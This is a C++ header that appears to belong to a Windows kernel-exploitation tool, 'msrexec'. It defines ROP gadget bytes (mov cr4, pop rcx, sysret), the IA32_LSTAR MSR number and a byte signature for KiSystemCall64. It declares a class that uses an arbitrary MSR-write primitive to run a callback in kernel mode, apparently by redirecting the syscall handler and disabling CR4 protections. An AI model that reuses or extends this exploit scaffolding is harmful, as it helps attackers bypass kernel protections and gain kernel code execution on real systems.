#pragma once
#include "utils.hpp"
#include "syscall_handler.h"
#include <intrin.h>

#define IA32_LSTAR_MSR 0xC0000082
#define MOV_CR4_GADGET "\x0F\x22\xE1\xC3"
#define POP_RCX_GADGET "\x59\xc3"
#define SYSRET_GADGET  "\x48\x0F\x07"

// not sure how far back this signature goes... works on 1507 though....
#define KI_SYSCALL_SIG "\x0F\x01\xF8\x65\x48\x89\x24\x25\x00\x00\x00\x00\x65\x48\x8B\x24\x25\x00\x00\x00\x00\x6A\x2B\x65\xFF\x34\x25\x00\x00\x00\x00\x41\x53\x6A\x00\x51\x49\x8B\xCA"
#define KI_SYSCALL_MASK "xxxxxxxx????xxxxx????xxxxxx????xxx?xxxx"
static_assert(sizeof KI_SYSCALL_SIG == sizeof KI_SYSCALL_MASK, "signature/mask invalid size...");

using get_system_routine_t = void* (*)(void*, const char*);
using callback_t = std::function<void(void*, get_system_routine_t)>;
using thread_info_t = std::pair<std::uint32_t, std::uint32_t>;
using writemsr_t = std::function<bool(std::uint32_t, std::uintptr_t)>;

extern "C" void msrexec_handler(callback_t* callback);
inline get_system_routine_t get_system_routine = nullptr;
inline void* ntoskrnl_base = nullptr;

namespace vdm
{
	class msrexec_ctx
	{
	public:
		explicit msrexec_ctx(writemsr_t wrmsr);
		void exec(callback_t kernel_callback);
		void set_wrmsr(writemsr_t wrmsr);
		auto get_wrmsr() -> writemsr_t const;
	private:
		auto find_gadgets() -> bool;
		auto find_globals() -> bool;
		writemsr_t wrmsr;
	};
}